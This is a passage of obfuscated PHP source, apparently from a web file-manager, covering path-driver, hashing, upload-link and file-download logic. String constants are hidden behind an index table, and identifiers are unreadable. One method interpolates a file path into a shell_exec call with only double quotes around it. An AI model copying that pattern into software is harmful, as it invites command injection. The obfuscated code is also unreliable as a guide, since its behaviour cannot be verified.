$¸ù©¡ßÈ[$ûº†ÜßË[2000]] = $Ú³àîÆÌ[$¸ù©¡ßÈ[$ûº†ÜßË[1982]]]; } } unset($¸ù©¡ßÈ); } private function _listAppendUser(&$Õ¥ÎµÉì) { $Œ–ƒˆØ• =& $_SERVER[Õò”†—·]; $’£ú‘‡ß = array_unique(array_to_keyvalue($Õ¥ÎµÉì, $Œ–ƒˆØ•[22], $Œ–ƒˆØ•[1755])); $’£ú‘‡ß = array_remove_value($’£ú‘‡ß, $Œ–ƒˆØ•[229]); if (count($’£ú‘‡ß) == 0) { return; } foreach ($Õ¥ÎµÉì as $ÈÔ’Œ») { if (isset($ÈÔ’Œ»[$Œ–ƒˆØ•[2000]])) { $’£ú‘‡ß[] = $ÈÔ’Œ»[$Œ–ƒˆØ•[2000]][$Œ–ƒˆØ•[1755]]; } } $Åè€õ¢ã = Model($Œ–ƒˆØ•[583])->userListInfo($’£ú‘‡ß); foreach ($Õ¥ÎµÉì as &$ÈÔ’Œ») { $ÈÔ’Œ»[$Œ–ƒˆØ•[646]] = $Åè€õ¢ã[$ÈÔ’Œ»[$Œ–ƒˆØ•[1755]]]; if (isset($ÈÔ’Œ»[$Œ–ƒˆØ•[2000]])) { $ÈÔ’Œ»[$Œ–ƒˆØ•[2000]][$Œ–ƒˆØ•[646]] = $Åè€õ¢ã[$ÈÔ’Œ»[$Œ–ƒˆØ•[2000]][$Œ–ƒˆØ•[1755]]]; } } unset($ÈÔ’Œ»); } private function _listAppendMeta(&$¥ÊÊº´¥) { $‹ÅÜ¶ˆ— =& $_SERVER[Õò”†—·]; $»‰›“…Ğ = array_unique(array_to_keyvalue($¥ÊÊº´¥, $‹ÅÜ¶ˆ—[22], $‹ÅÜ¶ˆ—[1990])); $»‰›“…Ğ = array_remove_value($»‰›“…Ğ, $‹ÅÜ¶ˆ—[229]); if (!$»‰›“…Ğ) { return; } foreach ($¥ÊÊº´¥ as $ÍÔ³™£Ÿ) { if (isset($ÍÔ³™£Ÿ[$‹ÅÜ¶ˆ—[2000]])) { $»‰›“…Ğ[] = $ÍÔ³™£Ÿ[$‹ÅÜ¶ˆ—[2000]][$‹ÅÜ¶ˆ—[1990]]; } } $•…ƒúÏÛ = $this->metaList($»‰›“…Ğ); if (!$•…ƒúÏÛ) { return !1; } foreach ($¥ÊÊº´¥ as &$ÍÔ³™£Ÿ) { $ÍÔ³™£Ÿ[$‹ÅÜ¶ˆ—[523]] = $•…ƒúÏÛ[$ÍÔ³™£Ÿ[$‹ÅÜ¶ˆ—[1990]]]; if (isset($ÍÔ³™£Ÿ[$‹ÅÜ¶ˆ—[2000]])) { $ÍÔ³™£Ÿ[$‹ÅÜ¶ˆ—[2000]][$‹ÅÜ¶ˆ—[523]] = $•…ƒúÏÛ[$ÍÔ³™£Ÿ[$‹ÅÜ¶ˆ—[2000]][$‹ÅÜ¶ˆ—[1990]]]; } } unset($ÍÔ³™£Ÿ); } private function metaList($ÕÑâÓâ½) { $Ô™¼ì¦¿ =& $_SERVER[Õò”†—·]; if (!$ÕÑâÓâ½) { return array(); } $ôøÛ”± = array($Ô™¼ì¦¿[1990] => array($Ô™¼ì¦¿[17], $ÕÑâÓâ½)); $„ÂÂï¢Œ = Model($Ô™¼ì¦¿[2001])->where($ôøÛ”±)->select(); $„ÂÂï¢Œ = array_to_keyvalue_group($„ÂÂï¢Œ, $Ô™¼ì¦¿[1990]); foreach ($„ÂÂï¢Œ as $àÌ½ Ÿã => $¥çìöà‚) { $¨Õ¡ÓÆñ = array(); foreach ($¥çìöà‚ as $ôğ˜¥ßè) { $¨Õ¡ÓÆñ[$ôğ˜¥ßè[$Ô™¼ì¦¿[107]]] = $ôğ˜¥ßè[$Ô™¼ì¦¿[434]]; } $„ÂÂï¢Œ[$àÌ½ Ÿã] = $¨Õ¡ÓÆñ; } return $„ÂÂï¢Œ ? $„ÂÂï¢Œ : array(); } public function removeTarget($ªáîÒª˜, $÷‰Ïµ–) { $èë°£ =& $_SERVER[Õò”†—·]; if (!$÷‰Ïµ–) { return !0; } $÷‰Ïµ– = is_array($÷‰Ïµ–) ? $÷‰Ïµ– : array($÷‰Ïµ–); $†‡é™Ş = array($èë°£[191] => $ªáîÒª˜, $èë°£[554] => array($èë°£[17], $÷‰Ïµ–)); $ÍÅÎ Àç = $this->field($èë°£[1990])->where($†‡é™Ş)->select(); $¦š·ñ¬ = array_to_keyvalue($ÍÅÎ Àç, $èë°£[22], $èë°£[1990]); if (!$¦š·ñ¬) { return !0; } $†‡é™Ş = array($èë°£[1990] => array($èë°£[17], $¦š·ñ¬)); $this->where($†‡é™Ş)->delete(); Model($èë°£[1993])->where($†‡é™Ş)->delete(); Model($èë°£[2002])->where($†‡é™Ş)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\154\x65\x5f\x63\157\156\x74\x65\156\164\163"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\124\x69\155\145", "\x74\x69\x6d\145", "\151\x6e\x73\145\162\x74", "\x66\165\156\143\x74\x69\x6f\x6e")); } goto c…•À„Î; BÛÛîİÜ‘·: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Øë¢›’ =& $_SERVER[Õò”†—·]; $this->objectDriver = array($Øë¢›’[70], $Øë¢›’[71], $Øë¢›’[72], $Øë¢›’[73], $Øë¢›’[74], $Øë¢›’[75], $Øë¢›’[76], $Øë¢›’[77], $Øë¢›’[78], $Øë¢›’[79], $Øë¢›’[80], $Øë¢›’[81]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($œ®æ“‚í) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($œ®æ“‚í, $_SERVER[Õò”†—·][18]); } return $œ®æ“‚í; } public function iconvApp($òÕàœœ§) { return $òÕàœœ§; } public function iconvSystem($èŸ®À‰) { return $èŸ®À‰; } public function iconvTo($ä€­ù˜, $¿Àö¨æ¼, $¶ ÇŞ¡Ä) { $„å‘Èæ² =& $_SERVER[Õò”†—·]; if (!$ä€­ù˜ || !function_exists($„å‘Èæ²[82])) { return $ä€­ù˜; } static $¬¾¨ü†¨ = array(); $Ì¥µò— = $¿Àö¨æ¼ . $„å‘Èæ²[83] . $¶ ÇŞ¡Ä . $„å‘Èæ²[84] . $ä€­ù˜; if (isset($¬¾¨ü†¨[$Ì¥µò—])) { return $¬¾¨ü†¨[$Ì¥µò—]; } if (function_exists($„å‘Èæ²[85])) { $„ÓşŸ–î = @mb_convert_encoding($ä€­ù˜, $¶ ÇŞ¡Ä, $¿Àö¨æ¼); } else { $„ÓşŸ–î = @iconv($¿Àö¨æ¼, $¶ ÇŞ¡Ä, $ä€­ù˜); } $„ÓşŸ–î = $„ÓşŸ–î ? $„ÓşŸ–î : $ä€­ù˜; if (strstr($„ÓşŸ–î, $„å‘Èæ²[86])) { $„ÓşŸ–î = str_replace($„å‘Èæ²[86], $„å‘Èæ²[21], $„ÓşŸ–î); } $¬¾¨ü†¨[$¿Àö¨æ¼ . $„å‘Èæ²[83] . $¶ ÇŞ¡Ä . $„å‘Èæ²[84] . $ä€­ù˜] = $„ÓşŸ–î; $¬¾¨ü†¨[$¶ ÇŞ¡Ä . $„å‘Èæ²[83] . $¿Àö¨æ¼ . $„å‘Èæ²[84] . $ä€­ù˜] = $ä€­ù˜; $¬¾¨ü†¨[$¶ ÇŞ¡Ä . $„å‘Èæ²[83] . $¿Àö¨æ¼ . $„å‘Èæ²[84] . $„ÓşŸ–î] = $ä€­ù˜; $¬¾¨ü†¨[$¿Àö¨æ¼ . $„å‘Èæ²[83] . $¶ ÇŞ¡Ä . $„å‘Èæ²[84] . $„ÓşŸ–î] = $„ÓşŸ–î; return $„ÓşŸ–î; } public function getPathInner($¶˜­³—Ö) { $ôø­àƒò = IO::init($¶˜­³—Ö); return $ôø­àƒò->path; } public function getPathOuter($õ¨Ó¤¸Ê) { $ïà—¨û =& $_SERVER[Õò”†—·]; $ŠÀƒ­­Œ = strlen(trim($this->pathBase, $ïà—¨û[18])); $õ¨Ó¤¸Ê = substr(trim($õ¨Ó¤¸Ê, $ïà—¨û[18]), $ŠÀƒ­­Œ); return $this->pathDriver . $ïà—¨û[18] . ltrim($õ¨Ó¤¸Ê, $ïà—¨û[18]); } public function isParentOf($Ç¯ÙòÖî, $ÂŒÕ»š’) { $ßİ½°€ =& $_SERVER[Õò”†—·]; $Ç¯ÙòÖî = rtrim(strtolower($Ç¯ÙòÖî), $ßİ½°€[18]) . $ßİ½°€[18]; $ÂŒÕ»š’ = rtrim(strtolower($ÂŒÕ»š’), $ßİ½°€[18]) . $ßİ½°€[18]; $›³¼€“¾ = strpos($ÂŒÕ»š’, $Ç¯ÙòÖî) === 0; return $›³¼€“¾; } public function getType() { $ÂÖ·©ÂÜ =& $_SERVER[Õò”†—·]; $á†¥„ ú = str_replace($ÂÖ·©ÂÜ[87], $ÂÖ·©ÂÜ[22], get_class($this)); return strtolower($á†¥„ ú); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ç±Ô·ƒ, $ÑÚ«æº) { $¹á–º˜Ş =& $_SERVER[Õò”†—·]; $ìÍ•ê™ = rtrim($Ç±Ô·ƒ, $¹á–º˜Ş[18]) . $¹á–º˜Ş[18] . $ÑÚ«æº; $í¨µ†”Ò = $this->exist($ìÍ•ê™); return $í¨µ†”Ò ? $ìÍ•ê™ : !1; } public function setModifyTime($ÎÎš˜Ó“, $ì×ßöÂú = '') { } public function renameObject($Ä¿Ü¿®ó, $ŠÈ•¦) { $“ú£ôŸ = $ŠÈ•¦; $Ä¿Ü¿®ó = $this->getPathOuter($Ä¿Ü¿®ó); $ŠÈ•¦ = $this->pathFather($Ä¿Ü¿®ó) . $ŠÈ•¦; $ÁµÍËÓÄ = IO::copy($Ä¿Ü¿®ó, $this->pathFather($Ä¿Ü¿®ó), REPEAT_RENAME_FOLDER, $“ú£ôŸ); if ($ÁµÍËÓÄ) { IO::remove($Ä¿Ü¿®ó); } return $ÁµÍËÓÄ ? $ŠÈ•¦ : !1; } public function tempFile($Ôöè “š = '', $óÈí¿ˆ = '') { if (!$Ôöè “š) { $Ôöè “š = rand_string(15); } $–§Øğ‘¤ = TEMP_FILES . rand_string(15) . $_SERVER[Õò”†—·][18]; @mkdir($–§Øğ‘¤, DEFAULT_PERRMISSIONS, !0); $ÍÛï—¨µ = $–§Øğ‘¤ . $Ôöè “š; @touch($ÍÛï—¨µ); if ($óÈí¿ˆ) { file_put_contents($ÍÛï—¨µ, $óÈí¿ˆ); } return $ÍÛï—¨µ; } public function tempFileRemve($Î¿§èãô) { @unlink($Î¿§èãô); @rmdir($this->pathFather($Î¿§èãô)); } public function mkfile($«¶ŞÂËˆ, $óï¶ŠÙ = '', $—„ÒòÇ± = REPEAT_RENAME) { } public function mkdir($Å™—Œ×ô, $ô×€¤¾€ = REPEAT_SKIP) { } public function delFile($—ºä¬âÏ) { } public function delFolder($°Øº„ã¿) { } public function copyFile($Û’˜œˆ¯, $ûÎ¦‘) { } public function moveFile($Ûˆ¤ª¿Ì, $ì¼«£ƒ) { } public function remove($³ÛÂüª‡) { if ($this->isFile($³ÛÂüª‡)) { return $this->delFile($³ÛÂüª‡); } return $this->delFolder($³ÛÂüª‡); } public function rename($ÃÄâÃ……, $¶×è´ÇØ) { } public function exist($Ğï„á) { } public function findByHash($‚ª™î¯É = '', $ñŠˆŠæˆ = '') { return !1; } public function isFile($ÊÆÏ¦») { } public function isFolder($‹¡Ç§™á) { } public function size($¬Ã•­«Ş) { } public function info($™—ÄËÉŒ) { } public function infoSimple($şä––Ç») { return $this->info($şä––Ç»); } public function infoAuth($Û¯µìµË) { return $this->info($Û¯µìµË); } public function infoFull($ø”’Ù‚†) { return $this->info($ø”’Ù‚†); } public function infoFullSimple($Ä®‹«Ñ˜) { return $this->info($Ä®‹«Ñ˜); } public function infoWithChildren($È¥€ë–©) { $ÒÒÒÛã— =& $_SERVER[Õò”†—·]; static $ÅÃİ€  = array(); if (isset($ÅÃİ€ [$È¥€ë–©])) { return $ÅÃİ€ [$È¥€ë–©]; } $ÑÑ¤¹· = $this->info($È¥€ë–©); if ($ÑÑ¤¹· && $ÑÑ¤¹·[$ÒÒÒÛã—[43]] == $ÒÒÒÛã—[88]) { $şÛ¶Œ“° = array($ÒÒÒÛã—[89] => 0, $ÒÒÒÛã—[90] => 0, $ÒÒÒÛã—[91] => 0); $this->infoChildren($È¥€ë–©, $şÛ¶Œ“°); $ÑÑ¤¹·[$ÒÒÒÛã—[89]] = $şÛ¶Œ“°[$ÒÒÒÛã—[89]]; $ÑÑ¤¹·[$ÒÒÒÛã—[92]] = array($ÒÒÒÛã—[93] => $şÛ¶Œ“°[$ÒÒÒÛã—[90]], $ÒÒÒÛã—[94] => $şÛ¶Œ“°[$ÒÒÒÛã—[91]]); $ÅÃİ€ [$È¥€ë–©] = $ÑÑ¤¹·; } return $ÑÑ¤¹·; } public function listPath($’§’Õ«å, $÷æ½¡˜ = false) { } public function has($çÂ¥åÁÇ, $Ë¯‘Õô = false, $ª«„»Úè = false) { } public function canRead($·¦¶Ñî) { } public function canWrite($îæØ®ùÚ) { } public function getContent($„ÊñËÁ) { } public function setContent($ÆŸéâÔ‡, $Üö…ã„‡ = '') { } protected function infoChildren($é‚àÕ÷, &$Îìàˆ—Ô) { $£ÔÃêÒè =& $_SERVER[Õò”†—·]; check_abort_echo(); $ÊĞóÜ’ = $this->listPath($é‚àÕ÷, !0); $ÊĞóÜ’ = array_merge($ÊĞóÜ’[$£ÔÃêÒè[95]], $ÊĞóÜ’[$£ÔÃêÒè[96]]); foreach ($ÊĞóÜ’ as $‘ÃË¤”Ë) { if ($‘ÃË¤”Ë[$£ÔÃêÒè[43]] == $£ÔÃêÒè[88]) { $Îìàˆ—Ô[$£ÔÃêÒè[91]]++; $¸®¶şÃÅ = $this->getPathInner($‘ÃË¤”Ë[$£ÔÃêÒè[97]]); $this->infoChildren($¸®¶şÃÅ, $Îìàˆ—Ô); } else { $Îìàˆ—Ô[$£ÔÃêÒè[90]]++; $Îìàˆ—Ô[$£ÔÃêÒè[89]] += $‘ÃË¤”Ë[$£ÔÃêÒè[89]]; } } } public function fileSubstr($Ë¨¹Û¥Ï, $¶è²¯À¿, $ĞèóËú) { } public function listAll($Ï”üÌÑ×) { } public function listAllMake($ÄĞ†é·è, &$ºÍ‡ò¦é) { $ËÒ¿ƒÎ£ =& $_SERVER[Õò”†—·]; check_abort_echo(); $“úè°ô = $this->listPath($ÄĞ†é·è, !0); if (!$“úè°ô) { return; } $î¬ÒÚŒ„ = array_merge($“úè°ô[$ËÒ¿ƒÎ£[95]], $“úè°ô[$ËÒ¿ƒÎ£[96]]); foreach ($î¬ÒÚŒ„ as $Ë•½«´‡) { $ÄíêÖ¦ = $Ë•½«´‡[$ËÒ¿ƒÎ£[43]] == $ËÒ¿ƒÎ£[88]; $õıÜ†É = array($ËÒ¿ƒÎ£[97] => $Ë•½«´‡[$ËÒ¿ƒÎ£[97]], $ËÒ¿ƒÎ£[88] => $ÄíêÖ¦); if (isset($Ë•½«´‡[$ËÒ¿ƒÎ£[89]])) { $õıÜ†É[$ËÒ¿ƒÎ£[89]] = $Ë•½«´‡[$ËÒ¿ƒÎ£[89]]; } if (isset($Ë•½«´‡[$ËÒ¿ƒÎ£[98]])) { $õıÜ†É[$ËÒ¿ƒÎ£[98]] = $Ë•½«´‡[$ËÒ¿ƒÎ£[98]]; } if (!$ÄíêÖ¦) { $ºÍ‡ò¦é[] = $õıÜ†É; continue; } $ºÍ‡ò¦é[] = $õıÜ†É; $Ş½Éµİ’ = $Ë•½«´‡[$ËÒ¿ƒÎ£[97]]; $æ”óúŒ = $this->pathDriver; if (substr($Ë•½«´‡[$ËÒ¿ƒÎ£[97]], 0, strlen($æ”óúŒ)) == $æ”óúŒ) { $Ş½Éµİ’ = substr($Ş½Éµİ’, strlen($æ”óúŒ)); } $this->listAllMake($Ş½Éµİ’, $ºÍ‡ò¦é); } } public function listAllSimple($úîêˆ±À, $•ƒä”Æ† = false) { $Ø±åÖ¹ = $this->listAll($úîêˆ±À); return $this->listAllSimpleMake($Ø±åÖ¹, $this->getPathOuter($úîêˆ±À), $•ƒä”Æ†); } public function listAllSimpleMake($Ô ­Ùâî, $ŞÜÙ¿©, $ĞÚ‘Ú„¡) { $¸şùÎ¬Û =& $_SERVER[Õò”†—·]; $Ñ×‰ = array(); $ŞÜÙ¿© = rtrim(get_path_father($ŞÜÙ¿©), $¸şùÎ¬Û[18]) . $¸şùÎ¬Û[18]; foreach ($Ô ­Ùâî as $ë¥Ù“öÖ) { $Æ«ùª = array($¸şùÎ¬Û[97] => $ë¥Ù“öÖ[$¸şùÎ¬Û[97]], $¸şùÎ¬Û[99] => $ë¥Ù“öÖ[$¸şùÎ¬Û[97]], $¸şùÎ¬Û[88] => $ë¥Ù“öÖ[$¸şùÎ¬Û[88]]); if (isset($ë¥Ù“öÖ[$¸şùÎ¬Û[89]]) && !$ë¥Ù“öÖ[$¸şùÎ¬Û[88]]) { $Æ«ùª[$¸şùÎ¬Û[89]] = $ë¥Ù“öÖ[$¸şùÎ¬Û[89]]; } if (isset($ë¥Ù“öÖ[$¸şùÎ¬Û[98]])) { $Æ«ùª[$¸şùÎ¬Û[98]] = $ë¥Ù“öÖ[$¸şùÎ¬Û[98]]; } if (is_array($ë¥Ù“öÖ[$¸şùÎ¬Û[100]])) { $Æ«ùª[$¸şùÎ¬Û[99]] = $ë¥Ù“öÖ[$¸şùÎ¬Û[100]][$¸şùÎ¬Û[97]]; $Æ«ùª[$¸şùÎ¬Û[89]] = $ë¥Ù“öÖ[$¸şùÎ¬Û[100]][$¸şùÎ¬Û[89]]; $Æ«ùª[$¸şùÎ¬Û[98]] = $ë¥Ù“öÖ[$¸şùÎ¬Û[100]][$¸şùÎ¬Û[98]]; } else { if (substr($ë¥Ù“öÖ[$¸şùÎ¬Û[97]], 0, strlen($ŞÜÙ¿©)) == $ŞÜÙ¿©) { $Æ«ùª[$¸şùÎ¬Û[97]] = substr($ë¥Ù“öÖ[$¸şùÎ¬Û[97]], strlen($ŞÜÙ¿©)); } } $Ó®ÃøæŞ = $ë¥Ù“öÖ[$¸şùÎ¬Û[88]] ? $¸şùÎ¬Û[18] : $¸şùÎ¬Û[22]; $Æ«ùª[$¸şùÎ¬Û[99]] = rtrim($Æ«ùª[$¸şùÎ¬Û[99]], $¸şùÎ¬Û[18]) . $Ó®ÃøæŞ; $Æ«ùª[$¸şùÎ¬Û[97]] = $¸şùÎ¬Û[18] . trim($Æ«ùª[$¸şùÎ¬Û[97]], $¸şùÎ¬Û[18]) . $Ó®ÃøæŞ; if (!$ĞÚ‘Ú„¡) { $ªÄÒÙ¬ = explode($¸şùÎ¬Û[18], trim($Æ«ùª[$¸şùÎ¬Û[97]], $¸şùÎ¬Û[18])); $Æ«ùª[$¸şùÎ¬Û[97]] = $¸şùÎ¬Û[18] . implode($¸şùÎ¬Û[18], array_slice($ªÄÒÙ¬, 1)) . $Ó®ÃøæŞ; } $Ñ×‰[] = $Æ«ùª; } return array_sort_by($Ñ×‰, $¸şùÎ¬Û[97]); } public function upload($¿’ùÀæÍ, $Í†½úŒš, $çºèÎÖø = false, $‚ÈÍñ¡ = REPEAT_REPLACE) { } public function uploadFileByID($ƒ§…¸’ƒ, $šçì¦©¨, $‹Á•Ç¥) { } public function uploadFileByPath($å†İäÒ¯, $ÈáµÃ…¤, $½õ = array()) { } public function isUploadServer() { $©ê†»ĞÇ =& $_SERVER[Õò”†—·]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $©ê†»ĞÇ[101]) { return !0; } return $GLOBALS[$©ê†»ĞÇ[16]][$©ê†»ĞÇ[102]][$©ê†»ĞÇ[103]]; } public function isFileOutServer() { $ôäÃº¾ =& $_SERVER[Õò”†—·]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ôäÃº¾[101]) { return !0; } return $GLOBALS[$ôäÃº¾[16]][$ôäÃº¾[102]][$ôäÃº¾[104]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($êùë÷”) { $ÊÂİú¡´ =& $_SERVER[Õò”†—·]; if (!$this->isCdnHost()) { return $êùë÷”; } return str_replace(trim(get_url_root($êùë÷”), $ÊÂİú¡´[18]), trim($this->cdnHost, $ÊÂİú¡´[18]), $êùë÷”); } public function uploadLink($¾ñæšÈ¿, $ÆŞ§—­ş = 0) { $œâ×ûíÊ =& $_SERVER[Õò”†—·]; if ($this->isUploadServer()) { return; } $Áçõ¡²¨ = $this->getType(); if (!in_array($Áçõ¡²¨, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $‚¤æ©»Ñ = 1024 * 1024 * 10; $íÔÃ¥Äû = $ÆŞ§—­ş <= $‚¤æ©»Ñ ? $œâ×ûíÊ[105] : $œâ×ûíÊ[106]; $”ÀŞ‰ÆÕ = (!$ÆŞ§—­ş ? 1 : ceil($ÆŞ§—­ş / pow(1024, 3))) * 3600 * 4; $€ò¥Â¸É = $this->{$íÔÃ¥Äû}($¾ñæšÈ¿, $”ÀŞ‰ÆÕ); if ($€ò¥Â¸É) { $€ò¥Â¸É[$œâ×ûíÊ[107]] = $¾ñæšÈ¿; $€ò¥Â¸É[$œâ×ûíÊ[108]] = $Áçõ¡²¨; } return $€ò¥Â¸É; } public function uploadFormData($œÈıá‚, $¾Í§Æóí = 3600) { } public function multiUploadFormData($«ÌÀÅÛÔ, $¼İ™€Öù = 3600) { } public function download($éò™²ÎŞ, $Íñ‘¶¼) { } public function ext($…ÚóªÄ) { $ºº·‚À‚ =& $_SERVER[Õò”†—·]; if (strpos($…ÚóªÄ, $ºº·‚À‚[18]) === -1) { $Ç¬– ¥Ÿ = $…ÚóªÄ; } else { $Ç¬– ¥Ÿ = $this->pathThis($…ÚóªÄ); } $Ì —­ñÌ = $ºº·‚À‚[22]; if (strstr($Ç¬– ¥Ÿ, $ºº·‚À‚[20])) { $Ì —­ñÌ = substr($Ç¬– ¥Ÿ, strrpos($Ç¬– ¥Ÿ, $ºº·‚À‚[20]) + 1); $Ì —­ñÌ = strtolower($Ì —­ñÌ); } if (strlen($Ì —­ñÌ) > 3 && preg_match($ºº·‚À‚[109], $Ì —­ñÌ, $–È®ÀÙ)) { $Ì —­ñÌ = $ºº·‚À‚[22]; } return $Ì —­ñÌ; } public function pathThis($ØÊğòÃ™) { $Ÿ¢Ÿ´‘Ñ =& $_SERVER[Õò”†—·]; $ØÊğòÃ™ = str_replace($Ÿ¢Ÿ´‘Ñ[110], $Ÿ¢Ÿ´‘Ñ[18], rtrim($ØÊğòÃ™, $Ÿ¢Ÿ´‘Ñ[18])); $ÙË°Ç‡Œ = strrpos($ØÊğòÃ™, $Ÿ¢Ÿ´‘Ñ[18]); if ($ÙË°Ç‡Œ === !1) { return $ØÊğòÃ™; } return substr($ØÊğòÃ™, $ÙË°Ç‡Œ + 1); } public function pathFather($şÅ¦Ã‹²) { $´ˆÂ„‚ˆ =& $_SERVER[Õò”†—·]; $şÅ¦Ã‹² = str_replace($´ˆÂ„‚ˆ[110], $´ˆÂ„‚ˆ[18], rtrim($şÅ¦Ã‹², $´ˆÂ„‚ˆ[18])); $¡ûó¡Øä = strrpos($şÅ¦Ã‹², $´ˆÂ„‚ˆ[18]); if ($¡ûó¡Øä === !1) { return $´ˆÂ„‚ˆ[22]; } return substr($şÅ¦Ã‹², 0, $¡ûó¡Øä + 1); } public function hashSimple($„å‘Î»Ó) { $êéï¿ò€ =& $_SERVER[Õò”†—·]; if (!$„å‘Î»Ó) { return md5($êéï¿ò€[22]); } $ãéÍøóŒ = $this->size($„å‘Î»Ó); $²ûÜËÍÇ = 200; $ùğø¢¾ğ = 50; if ($ãéÍøóŒ <= $²ûÜËÍÇ * $ùğø¢¾ğ) { return $this->hashMd5($„å‘Î»Ó) . $ãéÍøóŒ; } $ãÃ„Úåı = intval($ãéÍøóŒ / $ùğø¢¾ğ); $ííùà  = $êéï¿ò€[22]; for ($®¡‘ÏÖÇ = 0; $®¡‘ÏÖÇ < $ùğø¢¾ğ; $®¡‘ÏÖÇ++) { $ííùà  .= $this->fileSubstr($„å‘Î»Ó, $ãÃ„Úåı * $®¡‘ÏÖÇ, $²ûÜËÍÇ); } $ííùà  .= $this->fileSubstr($„å‘Î»Ó, $ãéÍøóŒ - $²ûÜËÍÇ, $²ûÜËÍÇ); return md5($ííùà ) . $ãéÍøóŒ; } public static $md5Cache = array(); public function hashMd5($íÇíÂÔÕ) { if (!$íÇíÂÔÕ) { return md5($_SERVER[Õò”†—·][22]); } $íÇíÂÔÕ = $this->iconvSystem($íÇíÂÔÕ); if (isset(self::$md5Cache[$íÇíÂÔÕ])) { return self::$md5Cache[$íÇíÂÔÕ]; } self::$md5Cache[$íÇíÂÔÕ] = $this->hashMd5Shell($íÇíÂÔÕ); if (!self::$md5Cache[$íÇíÂÔÕ]) { self::$md5Cache[$íÇíÂÔÕ] = @md5_file($íÇíÂÔÕ); } return self::$md5Cache[$íÇíÂÔÕ]; } private function hashMd5Shell($ù¯˜üÂÊ) { $ÀÔ—Ü€ï =& $_SERVER[Õò”†—·]; if (!$ù¯˜üÂÊ) { return md5($ÀÔ—Ü€ï[22]); } if (!function_exists($ÀÔ—Ü€ï[111])) { return !1; } $®Ïõéá¨ = array($ÀÔ—Ü€ï[112], $ÀÔ—Ü€ï[113]); $ö¶Ş“ = Cache::get($ÀÔ—Ü€ï[114]); if (!$ö¶Ş“) { $¾ãÑ¥µ = BASIC_PATH . $ÀÔ—Ü€ï[115]; $ˆ‹°ë ¶ = md5_file($¾ãÑ¥µ); $ö¶Ş“ = $ÀÔ—Ü€ï[116]; foreach ($®Ïõéá¨ as $îÉ·¢Ò) { $«¯óòÃ¸ = shell_exec($îÉ·¢Ò . "\x20\42{$¾ãÑ¥µ}\42"); if ($«¯óòÃ¸ && substr(trim($«¯óòÃ¸), 0, 32) == $ˆ‹°ë ¶) { $ö¶Ş“ = $îÉ·¢Ò; break; } } Cache::set($ÀÔ—Ü€ï[114], $ö¶Ş“, 3600); } if ($ö¶Ş“ == $ÀÔ—Ü€ï[116]) { return !1; } $«¯óòÃ¸ = shell_exec($ö¶Ş“ . "\40\x22{$ù¯˜üÂÊ}\x22"); $«¯óòÃ¸ = str_replace($ÀÔ—Ü€ï[117], $ÀÔ—Ü€ï[22], $«¯óòÃ¸); return substr($«¯óòÃ¸, 0, 32); } public function link($Ğ‚Àô½É) { return $Ğ‚Àô½É; } public function fileOut($óÇ®éÜ, $­©ŞĞµ¦ = false, $üŞÔ£ûé = false, $Ä“ïõğá = '') { $şº…Ú¢° =& $_SERVER[Õò”†—·]; $this->cacheMethod(null, null); if (!$óÇ®éÜ || !$this->exist($óÇ®éÜ)) { show_json(LNG($şº…Ú¢°[118]), !1, $üŞÔ£ûé); } $åŸÕã›² = $this->getType() == $şº…Ú¢°[119]; $²¡Î³Ö = $GLOBALS[$şº…Ú¢°[16]][$şº…Ú¢°[102]][$şº…Ú¢°[120]][$şº…Ú¢°[121]]; $ãÜò‡ë¸ = (double) $GLOBALS[$şº…Ú¢°[16]][$şº…Ú¢°[102]][$şº…Ú¢°[120]][$şº…Ú¢°[122]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $õ• Øçä = $this->infoFull($óÇ®éÜ); $ä¾¯Àğõ = $õ• Øçä[$şº…Ú¢°[89]]; $Éâèıö = gmdate($şº…Ú¢°[123], $õ• Øçä[$şº…Ú¢°[98]]); $Í¯”µ«† = $üŞÔ£ûé ? $üŞÔ£ûé : $this->iconvApp($õ• Øçä[$şº…Ú¢°[42]]); $óÇ™ÄĞŞ = 0; $¥ş…›¿ = $ä¾¯Àğõ - 1; $ªÂğùÃû = $this->ext($Í¯”µ«†); if (in_array($ªÂğùÃû, array($şº…Ú¢°[124], $şº…Ú¢°[125], $şº…Ú¢°[126], $şº…Ú¢°[127]))) { $ªÂğùÃû = $şº…Ú¢°[128]; } if (in_array($ªÂğùÃû, array($şº…Ú¢°[129]))) { $ªÂğùÃû = $şº…Ú¢°[130]; } if (!$Ä“ïõğá) { $Ä“ïõğá = md5($Éâèıö . $ä¾¯Àğõ); } $Ä“ïõğá = $şº…Ú¢°[131] . $Ä“ïõğá . $şº…Ú¢°[131]; $ÑŠÆËòï = get_file_mime($ªÂğùÃû); $¤Ä¡Ã¦È = !0; $¤Ä¡Ã¦È = isset($_GET[$şº…Ú¢°[132]]) ? !1 : !0; if ($­©ŞĞµ¦ === !1 && !mime_support($ÑŠÆËòï)) { $ÑŠÆËòï = $şº…Ú¢°[133]; } header($şº…Ú¢°[134]); header($şº…Ú¢°[135] . $ÑŠÆËòï); $·¯‘óşé = rawurlencode($Í¯”µ«†); $·¯‘óşé = $şº…Ú¢°[131] . $·¯‘óşé . $şº…Ú¢°[136] . $·¯‘óşé; if ($­©ŞĞµ¦) { header($şº…Ú¢°[137]); header($şº…Ú¢°[138] . $·¯‘óşé); } else { if ($¤Ä¡Ã¦È) { header($şº…Ú¢°[139] . $·¯‘óşé); } } header($şº…Ú¢°[140] . gmdate($şº…Ú¢°[123], time() + 3600 * 24 * 30) . $şº…Ú¢°[141]); header($şº…Ú¢°[142]); header($şº…Ú¢°[143]); header($şº…Ú¢°[144]); if (isset($_SERVER[$şº…Ú¢°[145]]) && strtotime($_SERVER[$şº…Ú¢°[145]]) == $õ• Øçä[$şº…Ú¢°[98]]) { header($şº…Ú¢°[146], !0, 304); die; } if 